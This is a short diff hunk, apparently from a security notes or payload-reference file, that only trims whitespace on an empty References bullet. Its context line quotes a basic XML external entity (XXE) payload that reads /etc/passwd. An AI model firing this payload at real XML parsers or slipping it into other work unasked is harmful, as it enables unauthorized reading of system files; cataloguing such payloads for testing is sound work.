@@ -34,4 +34,4 @@
 - [S1] "xxe": { "basic": ["<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>", ...] }
 
 ## References
-- 
+-
